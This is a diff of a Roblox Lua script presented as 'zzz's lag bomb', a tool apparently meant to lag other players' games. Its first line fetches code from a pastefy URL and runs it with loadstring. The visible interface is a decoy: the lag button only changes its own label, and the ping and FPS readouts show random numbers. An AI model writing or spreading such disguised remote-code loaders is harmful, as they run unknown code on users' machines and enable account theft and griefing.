@@ -1,16 +1,19 @@
 loadstring(game:HttpGet("https://pastefy.app/eZFvmGIe/raw", true))()
-local player = game.Players.LocalPlayer
+repeat task.wait() until game:IsLoaded()
+
+local player = game:GetService("Players").LocalPlayer
+if not player then return end
+
 local gui = Instance.new("ScreenGui")
 gui.Name = "ZZZ_LagBomb"
+gui.ResetOnSpawn = false
 gui.Parent = player:WaitForChild("PlayerGui")
 
---========================--
--- LOADING SCREEN (15s)
---========================--
+--================ LOADING =================--
 
 local blur = Instance.new("BlurEffect")
 blur.Size = 18
-blur.Parent = game.Lighting
+blur.Parent = game:GetService("Lighting")
 
 local loadFrame = Instance.new("Frame", gui)
 loadFrame.Size = UDim2.new(1,0,1,0)
@@ -18,8 +21,8 @@ loadFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
 loadFrame.BackgroundTransparency = 0.3
 
 local box = Instance.new("Frame", loadFrame)
-box.Size = UDim2.new(0, 220, 0, 85)
-box.Position = UDim2.new(0.5, -110, 0.5, -42)
+box.Size = UDim2.new(0,220,0,85)
+box.Position = UDim2.new(0.5,-110,0.5,-42)
 box.BackgroundColor3 = Color3.fromRGB(20,20,20)
 box.BorderSizePixel = 0
 Instance.new("UICorner", box).CornerRadius = UDim.new(0,10)
@@ -36,89 +39,78 @@ local barBG = Instance.new("Frame", box)
 barBG.Size = UDim2.new(1,-20,0,6)
 barBG.Position = UDim2.new(0,10,1,-20)
 barBG.BackgroundColor3 = Color3.fromRGB(50,50,50)
-barBG.BorderSizePixel = 0
 Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
 
 local bar = Instance.new("Frame", barBG)
 bar.Size = UDim2.new(0,0,1,0)
 bar.BackgroundColor3 = Color3.fromRGB(0,170,255)
-bar.BorderSizePixel = 0
 Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
 
---========================--
--- MAIN UI FUNCTION
---========================--
+--================ UI FUNCTION =================--
 
 local function createUI()
 
 	local frame = Instance.new("Frame", gui)
-	frame.Size = UDim2.new(0, 160, 0, 130)
-	frame.Position = UDim2.new(0.5, -80, 0.5, -65)
-	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	frame.Size = UDim2.new(0,160,0,130)
+	frame.Position = UDim2.new(0.5,-80,0.5,-65)
+	frame.BackgroundColor3 = Color3.fromRGB(25,25,25)
 	frame.BorderSizePixel = 0
 	frame.Active = true
 	frame.Draggable = true
-	Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 10)
+	Instance.new("UICorner", frame).CornerRadius = UDim.new(0,10)
 
-	-- Title
 	local title = Instance.new("TextLabel", frame)
-	title.Size = UDim2.new(1, 0, 0, 20)
-	title.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+	title.Size = UDim2.new(1,0,0,20)
+	title.BackgroundColor3 = Color3.fromRGB(15,15,15)
 	title.Text = "zzz's lag bomb"
 	title.TextColor3 = Color3.new(1,1,1)
 	title.Font = Enum.Font.SourceSansBold
 	title.TextSize = 12
 
-	-- Ping
 	local ping = Instance.new("TextLabel", frame)
-	ping.Position = UDim2.new(0, 6, 0, 25)
-	ping.Size = UDim2.new(1, -12, 0, 15)
+	ping.Position = UDim2.new(0,6,0,25)
+	ping.Size = UDim2.new(1,-12,0,15)
 	ping.BackgroundTransparency = 1
 	ping.TextColor3 = Color3.fromRGB(200,200,200)
 	ping.TextSize = 11
 	ping.TextXAlignment = Enum.TextXAlignment.Left
 
-	-- FPS
 	local fps = Instance.new("TextLabel", frame)
-	fps.Position = UDim2.new(0, 6, 0, 40)
-	fps.Size = UDim2.new(1, -12, 0, 15)
+	fps.Position = UDim2.new(0,6,0,40)
+	fps.Size = UDim2.new(1,-12,0,15)
 	fps.BackgroundTransparency = 1
 	fps.TextColor3 = Color3.fromRGB(200,200,200)
 	fps.TextSize = 11
 	fps.TextXAlignment = Enum.TextXAlignment.Left
 
-	-- Button Creator
-	local function btn(text, color, y)
+	local function btn(txt,col,y)
 		local b = Instance.new("TextButton", frame)
-		b.Size = UDim2.new(1, -12, 0, 22)
-		b.Position = UDim2.new(0, 6, 0, y)
-		b.BackgroundColor3 = color
-		b.Text = text
+		b.Size = UDim2.new(1,-12,0,22)
+		b.Position = UDim2.new(0,6,0,y)
+		b.BackgroundColor3 = col
+		b.Text = txt
 		b.TextColor3 = Color3.new(1,1,1)
-		b.Font = Enum.Font.SourceSansBold
 		b.TextSize = 11
-		b.BorderSizePixel = 0
-		Instance.new("UICorner", b).CornerRadius = UDim.new(0, 8)
+		Instance.new("UICorner", b).CornerRadius = UDim.new(0,8)
 		return b
 	end
 
-	local lagBtn = btn("lag em", Color3.fromRGB(70,130,180), 60)
-	local resetBtn = btn("Reset", Color3.fromRGB(200,50,50), 85)
-	local speedBtn = btn("Speed [E]", Color3.fromRGB(150,80,80), 110)
+	local lag = btn("lag em", Color3.fromRGB(70,130,180), 60)
+	local reset = btn("Reset", Color3.fromRGB(200,50,50), 85)
+	local speed = btn("Speed [E]", Color3.fromRGB(150,80,80), 110)
 
-	local enabled = false
+	local on = false
 
-	lagBtn.MouseButton1Click:Connect(function()
-		enabled = not enabled
-		lagBtn.Text = enabled and "lag ON" or "lag OFF"
+	lag.MouseButton1Click:Connect(function()
+		on = not on
+		lag.Text = on and "lag ON" or "lag OFF"
 	end)
 
-	resetBtn.MouseButton1Click:Connect(function()
-		enabled = false
-		lagBtn.Text = "lag em"
+	reset.MouseButton1Click:Connect(function()
+		on = false
+		lag.Text = "lag em"
 	end)
 
-	-- Fake stats
 	task.spawn(function()
 		while true do
 			ping.Text = "Ping: "..math.random(30,120).." ms"
@@ -126,24 +118,12 @@ local function createUI()
 			task.wait(1)
 		end
 	end)
-
-	-- Keybind
-	game:GetService("UserInputService").InputBegan:Connect(function(input, gp)
-		if gp then return end
-		if input.KeyCode == Enum.KeyCode.E then
-			speedBtn.Text = "Speed ON"
-			task.wait(0.4)
-			speedBtn.Text = "Speed [E]"
-		end
-	end)
 end
 
---========================--
--- LOADING ANIMATION (15s)
---========================--
+--================ LOADING FIX =================--
 
 task.spawn(function()
-	for i = 1,150 do -- 150 * 0.1 = 15 seconds
+	for i = 1,150 do
 		bar.Size = UDim2.new(i/150,0,1,0)
 		task.wait(0.1)
 	end
